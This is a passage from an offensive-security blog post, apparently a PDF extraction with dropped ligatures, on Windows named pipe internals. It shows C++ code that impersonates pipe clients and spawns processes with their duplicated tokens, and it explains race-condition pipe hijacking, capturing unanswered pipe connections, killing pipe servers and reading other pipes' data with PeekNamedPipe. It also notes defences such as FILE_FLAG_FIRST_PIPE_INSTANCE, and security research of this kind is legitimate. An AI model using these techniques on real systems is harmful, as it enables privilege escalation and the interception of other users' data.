/* --> The server will obtain a token based on the privileges of the u
ser running the server.  
        A user holding SeImpersonatePrivilege will get an SECURITY_IMP
ERSONATION token */ 
// In this call the Impersonation Level will default to SECURITY_ANONY
MOUS and will be respected 
hFile = CreateFile(L"\\ServerA.domain.local", GENERIC_READ, 0, NULL, O
PEN_EXISTING, SECURITY_SQOS_PRESENT, NULL); 
/* --> The server will obtain a SECURITY_ANONYMOUS token. A call to  O
penThreadToken will result in error 1347 (0x543, ERROR_CANT_OPEN_ANONY
MOUS)*/ 
You can nd an a full implementation in my sample code here. A quick run down of
the implementation is shown below:
// Create a server named pipe 
serverPipe = CreateNamedPipe( 
    pipeName,           // name of our pipe, must be in the form of
 \\.\pipe\ 
    PIPE_ACCESS_DUPLEX, // The rest of the parameters don't really mat
ter 
    PIPE_TYPE_MESSAGE, // as all you want is impersonate the clien
t... 
    1,  
//  
    2048, 
//  
    2048, 
//  
    0,  
//  
    NULL 
// This should ne NULL so every client can connect 
); 
// wait for pipe connections 
BOOL bPipeConnected = ConnectNamedPipe(serverPipe, NULL); 
// Impersonate client 
BOOL bImpersonated = ImpersonateNamedPipeClient(serverPipe); 
// if successful open Thread token - your current thread token is now
 the client's token 
BOOL bSuccess = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 
FALSE, &hToken); 
// now you got the client token saved in hToken and you can safeyl rev
ert back to self 
bSuccess = RevertToSelf(); 
// Now duplicate the client's token to get a Primary token 
bSuccess = DuplicateTokenEx(hToken, 
Implementation
    TOKEN_ALL_ACCESS, 
    NULL, 
    SecurityImpersonation, 
    TokenPrimary, 
    &hDuppedToken 
); 
// If that succeeds you got a Primary token as hDuppedToken and you ca
n create a proccess with that token 
CreateProcessWithTokenW(hDuppedToken, LOGON_WITH_PROFILE, command, NUL
L, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi); 
The result can be seen below:
There are some catches when you implement this on your own:
>> When you create a process with CreateProcessWithTokenW, you need to
RevertToSelf before calling CreateProcessWithTokenW otherwise you’ll receive
an error.
>> When you want to create a window based process (something with a window
that pops up, such as calc.exe or cmd.exe) you need to grant the client access
to your Window and Desktop. A sample implementation allowing all users to
access to your Window and Desktop can be found here.
Named Pipes instances are created and live within a global ‘namespace’ (actually
technically there is no namespace, but this aids understanding that all named pipes
live under to same roof) within the Name Pipe File System (NPFS) device drive.
Moreover multiple named pipes with the same name can exist under this one roof.
So what happens if an application creates a named pipe that already exists? Well if
you don’t set the right ags nothing happens, meaning you won’t get an error and
even worse you won’t get client connections, due to the fact that Named Pipe
instances are organized in a FIFO (First In First Out) stack. 
This design makes Named Pipes vulnerable for instance creation race condition
vulnerabilities.
The attack scenario to exploit such a race condition is as follows: You’ve identied a
service, program or routine that creates a named pipe that is used by client
applications running in a different security context (let’s say they run under the NT
Service user). The server creates a named pipe for communication with the client
application(s). Once in a while a client connects to the server’s named pipe - it
Instance Creation Race Condition
Attack scenario
wouldn’t be uncommon if the server application triggers the clients to connect after
the server pipe is created. You gure out when and how the server is started and the
name of the pipe it creates. 
Now you’re writing a program that creates a named pipe with the same name in a
scenario where your named pipe instance is created before the target server’s
named pipe. If the server’s named pipe is created insecurely it will not notice that a
named pipe with the same name already exist and will trigger the clients to
connect. Due to the FIFO stack the clients will connect to you and you can read or
write their data or try to impersonate the clients.
For this attack to work you need a target server that doesn’t check if a named pipe
with the same name already exists. Usually a server doesn’t have extra code to
check manually if a pipe with the same name already exists - thinking about it you
would expect to get an error if your pipe name already exists right? But that doesn’t
happen because two named pipe instances with the same name are absolutely valid
… for whatever reason. 
But to counter this attack Microsoft has added the
FILE_FLAG_FIRST_PIPE_INSTANCE ag that can be specied when creating your
named pipe through CreateNamedPipe. When this ag is set your create call will
return an INVALID_HANDLE_VALUE, which will cause an error in a subsequent call
to ConnectNamedPipe.
If you’re target server does not specify the FILE_FLAG_FIRST_PIPE_INSTANCE ag it
is likely vulnerable, however there is one additional thing you need to be aware of
on the attacker side. When creating a named pipe through CreateNamedPipe there
is a nMaxInstances parameter, which species…:
The maximum number of instances that can be created for this pipe.
The rst instance of the pipe can specify this value;  
Source: CreateNamedPipe
So if you set this to ‘1’ (as in the sample code above) you kill your own attack vector.
To exploit an instance creation race condition vulnerability set this to
PIPE_UNLIMITED_INSTANCES.
All you need to do for exploitation is create a named pipe instance with the right
name at the right time. 
My sample implementation here can be used as an implementation template.
Throw this in you favorite IDE, set in your pipe name, ensure your named pipe is
created with the PIPE_UNLIMITED_INSTANCES ag and re away.
Prerequisites
Implementation
Instance Creation Special Flavors
Unanswered Pipe Connections
Unanswered pipe connections are those connection attempts issued by clients that -
who would have guessed it - are not successful, hence unanswered, because the
pipe that is requested by the client is not existing. 
The exploit potential here is quite clear and simple: If a client wants to connect to a
pipe that’s not existing, we create a pipe that the client can connect to and attempt
to manipulate the client with malicious communication or impersonate the client to
gain additional privileges.
This vulnerability is sometimes also referred to as superuous pipe connections (but
in my mind that’s not the best terminology for it).
The real question here is: How do we nd such clients? 
My initial immediate answer would have been: Fire up Procmon and search for
failed CreateFile system calls. But I tested this and it turns out Procmon does not
list these calls for pipes… maybe that is because the tool is only
inspecting/listening on le operations through the NTFS driver, but i haven’t looked
any deeper into this (maybe there is a trick/switch i didn’t know) - I’ll update if I
stumble across the answer…
Another option is the Pipe Monitor of the IO Ninja toolset. This tool requires a
license, but offers a free trial period to play around with it. The Pipe Monitor offers
functionality to inspect pipe activity on the system and comes with a few basic
lters for processes, le names and such. As you want to search for all processes
and all le names I ltered for ‘*’, let it run and used the search function to look for
‘Cannot open’:
If you know any other way to do this using open source tooling, let me know (/
0xcsandker) ;)
If you can’t nd unanswered pipe connection attempts, but identied an interesting
pipe client, that you’d like to talk to or impersonate, another option to get the
client’s connection is to kill its current pipe server. 
In the Instance Creation Race Condition section I’ve described that you can have
Killing Pipe Servers
multiple named pipes with the same name in the same ‘namespace’. 
If your target server didn’t set the nMaxInstances parameter to ‘1’, you can create a
second named pipe server with the same name and place yourself in the queue to
serve clients. You will not receive any client calls as long as the original pipe server
is serving, so the idea for this attack is to disrupt or kill the original pipe server to
step in with your malicious server.
When it comes to killing or disrupting the original pipe server I can’t assist with any
general purpose prerequisites or implementations, because this always depends on
who is running the target server and on your access rights and user privileges. 
When analyzing your target server for kill techniques try to think outside the box,
there is more than just sending a shutdown signal to a process, e.g. there could be
error conditions that cause the server to shutdown or restart (remember you’re
number 2 in the queue - a restart might be enough to get in position). 
Also note that a pipe server is just an instance running on a virtual FILE_OBJECT,
therefore all named pipe servers will be terminated once their handle reference
count reaches 0. A handle is for example opened by a client connecting to it. So a
server could also be killed by killing all its handles (of course you only gain
something if the clients come back to you after loosing connection).
There might be scenarios where you’re interested in the data that is exchanged
rather than in manipulating or impersonating pipe clients. 
Due to the fact that all named pipe instances live under the same roof, aka. in the
same global ‘namespace’ aka. on the same virtual NPFS device drive (as briey
mentioned before) there is no system barrier that stops you from connecting to any
arbitrary (SYSTEM or non-SYSTEM) named pipe instance and have a look at the data
in the pipe (technically ‘in the pipe’ means within the shared memory section
allocated by the pipe server). 
As mentioned in the section Named Pipe Security the only gear you can turn when
securing your named pipe is using a Security Descriptor as the last parameter
(lpSecurityAttributes) to the CreateNamedPipe call. And that’s all that would prevent
you from accessing any arbitrary named pipe instance. So all you need to check for
when searching for a target is if this parameter is set and secured to prevent
unauthorized access. 
If you need some background on Security Descriptors and what to look for (the ACLs
in the DACL) check out my post: A Windows Authorization Guide
When you found a suitable target there is one more thing you need to keep in mind:
If you’re reading from a named pipe by using ReadFile, you’re removing the data
from the server’s shared memory and the next, potentially legitimate client, who
attempts to read from the pipe will not nd any data and potentially raise an error. 
PeekNamedPipe
Prerequisites
Implementation
But you can use the PeekNamedPipe function to view the data without removing it
from shared memory.
An implementation snippet based on the my sample code could look like this:
// all the vars you need 
const int MESSAGE_SIZE = 512; 
BOOL bSuccess; 
LPCWSTR pipeName = L"\\\\.\\pipe\\fpipe"; 
HANDLE hFile = NULL; 
LPWSTR pReadBuf[MESSAGE_SIZE] = { 0 }; 
LPDWORD pdwBytesRead = { 0 }; 
LPDWORD pTotalBytesAvail = { 0 }; 
LPDWORD pBytesLeftThisMessage = { 0 }; 
// connect to named pipe 
hFile = CreateFile(pipeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, SEC
URITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL); 
// sneak peek data 
bSuccess = PeekNamedPipe( 
    hFile, 
    pReadBuf, 
    MESSAGE_SIZE, 
    pdwBytesRead, 
    pTotalBytesAvail, 
    pBytesLeftThisMessage 
); 
That’s about it, if you want to continue to dig into Named Pipes here are some good
references to start with:
>> Microsoft’s Docs about pipes at https://docs.microsoft.com/en-
us/windows/win32/ipc/pipes
>> Blake Watts paper about Named Pipe Security at
http://www.blakewatts.com/namedpipepaper.html
>> My Sample C++ Implementation at
https://github.com/csandker/InterProcessCommunication-
Samples/tree/master/NamedPipes/CPP-NamedPipe-Basic-Client-Server
Part 2 of the series, covering RPC can be found here: Offensive Windows IPC
Internals 2: RPC
Other Posts
References
The Series: Part 2
Debugging and Reversing ALPC 29 May 2022
Offensive Windows IPC Internals 3: ALPC 24 May 2022
Offensive Windows IPC Internals 2: RPC 21 Feb 2021